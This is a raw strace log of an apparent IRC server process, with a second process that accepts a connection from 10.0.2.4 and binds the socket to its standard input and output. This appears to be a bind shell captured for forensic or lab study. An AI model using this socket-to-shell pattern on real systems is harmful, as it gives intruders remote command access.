4519  20:20:27.669614 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669627 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669642 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669655 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669669 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669682 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669696 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669710 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669723 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669737 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669751 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669764 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669778 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669792 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669805 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669826 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669842 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669856 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669870 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669888 gettimeofday({1495671627, 669892}, NULL) = 0
4519  20:20:27.669899 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {0, 820000})
4519  20:20:27.854415 clock_gettime(CLOCK_MONOTONIC, {48437, 671436340}) = 0
4519  20:20:27.854438 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  20:20:27.854453 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  20:20:27.854475 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  20:20:27.854492 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  20:20:27.854532 close(5)          = 0
4519  20:20:27.854546 time(NULL)        = 1495671627
4519  20:20:27.854556 time(NULL)        = 1495671627
4519  20:20:27.854567 gettimeofday({1495671627, 854571}, NULL) = 0
4519  20:20:27.854580 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:20:27.854609 clock_gettime(CLOCK_MONOTONIC, {48437, 671622032}) = 0
4519  20:20:27.854620 gettimeofday({1495671627, 854623}, NULL) = 0
4519  20:20:27.854630 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
11809 20:20:27.879062 <... accept resumed> {sa_family=AF_INET, sin_port=htons(43537), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
11809 20:20:27.879072 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4dee8) = -1 EINVAL (Invalid argument)
11809 20:20:27.879087 _llseek(8, 0, 0xbfd4df30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11809 20:20:27.879098 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4dee8) = -1 EINVAL (Invalid argument)
11809 20:20:27.879109 _llseek(8, 0, 0xbfd4df30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11809 20:20:27.879119 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
11809 20:20:27.879161 close(6)          = 0
11809 20:20:27.879229 dup(8)            = 6
11809 20:20:27.879241 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4ed88) = -1 EINVAL (Invalid argument)
11809 20:20:27.879252 _llseek(6, 0, 0xbfd4edd0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11809 20:20:27.879262 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
11809 20:20:27.879281 dup2(6, 1)        = 1
11809 20:20:27.879292 close(6)          = 0
11809 20:20:27.879303 fcntl64(1, F_SETFD, 0) = 0
11809 20:20:27.879314 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4ed58) = -1 EINVAL (Invalid argument)
11809 20:20:27.879324 _llseek(1, 0, 0xbfd4eda0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11809 20:20:27.879352 dup(8)            = 6
11809 20:20:27.879364 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4ed88) = -1 EINVAL (Invalid argument)
11809 20:20:27.879374 _llseek(6, 0, 0xbfd4edd0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11809 20:20:27.879384 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
11809 20:20:27.879400 dup2(6, 0)        = 0
11809 20:20:27.879410 close(6)          = 0
11809 20:20:27.879419 fcntl64(0, F_SETFD, 0) = 0
11809 20:20:27.879432 fcntl64(0, F_SETFD, 0) = 0
11809 20:20:27.879447 read(0,  <unfinished ...>
4519  20:20:27.989850 <... select resumed> ) = 1 (in [4], left {0, 860000})
4519  20:20:27.989891 clock_gettime(CLOCK_MONOTONIC, {48437, 806906044}) = 0
4519  20:20:27.989908 recv(4, "AWAY  ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 59
4519  20:20:27.989935 gettimeofday({1495671627, 989940}, NULL) = 0
4519  20:20:27.989949 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
